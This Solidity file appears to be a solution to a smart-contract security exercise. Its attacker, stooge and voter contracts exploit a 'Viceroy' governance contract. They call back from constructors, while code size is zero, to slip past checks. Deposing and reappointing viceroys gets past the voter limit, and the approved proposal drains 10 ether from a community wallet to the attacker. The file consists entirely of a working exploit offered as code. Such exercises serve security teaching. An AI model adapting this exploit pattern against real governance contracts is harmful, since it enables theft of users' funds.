// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "week10-11-security2/Viceroy.sol";

contract GovernanceAttacker {
    address public owner;
    ViceroyStooge public viceroy;

    Governance governance;

    Voter voter;

    constructor() {
        owner = msg.sender;
    }

    function attack(Governance governance_) external {
        console.log("attack()");
        governance = governance_;

        // This will automatically appoint the viceroy
        viceroy = new ViceroyStooge(governance);

        // Viceroy is appointed

        viceroy.createProposal();

        // Generate first 5 voters
        viceroy.generateVoters();

        // Depose viceroy
        console.log("deposeViceroy()");
        governance.deposeViceroy(address(viceroy), 1);

        // Generate a new viceroy
        viceroy = new ViceroyStooge(governance);

        // Generate next 5 voters
        viceroy.generateVoters();

        // Execute proposal
        governance.executeProposal(viceroy.proposalId());
    }

    // The viceroy should call this function from its constructor,
    // giving us its address while also still having a code size of zero.
    function appointViceroy() external {
        console.log("appointViceroy()");

        // Appoint viceroy
        governance.appointViceroy(address(msg.sender), 1);
    }
}

contract ViceroyStooge {
    uint256 constant VOTER_AMOUNT = 5;

    bytes proposal;
    uint256 public proposalId;

    Governance governance;
    GovernanceAttacker attacker;
    Voter voter;

    constructor(Governance governance_) {
        governance = governance_;
        attacker = GovernanceAttacker(msg.sender);

        proposal = abi.encodeWithSelector(
            CommunityWallet.exec.selector,
            attacker.owner(),
            "",
            10 ether
        );

        proposalId = uint256(keccak256(proposal));

        // Appoint myself
        attacker.appointViceroy();
    }

    function generateVoters() external {
        console.log("generateVoters()");

        for (uint256 i; i < VOTER_AMOUNT; i++) {
            // This will automatically approve the voter
            voter = new Voter(governance);

            // Vote
            voter.vote();
        }
    }

    function approveVoter() external {
        console.log("approveVoter()", msg.sender);
        governance.approveVoter(msg.sender);
    }

    function createProposal() external {
        console.log("createProposal()");
        governance.createProposal(address(this), proposal);
    }
}

contract Voter {
    Governance governance;
    ViceroyStooge viceroy;

    constructor(Governance governance_) {
        governance = governance_;
        viceroy = ViceroyStooge(msg.sender);

        viceroy.approveVoter();
    }

    function vote() external {
        console.log("vote()", address(this));
        governance.voteOnProposal(viceroy.proposalId(), true, address(viceroy));
    }
}
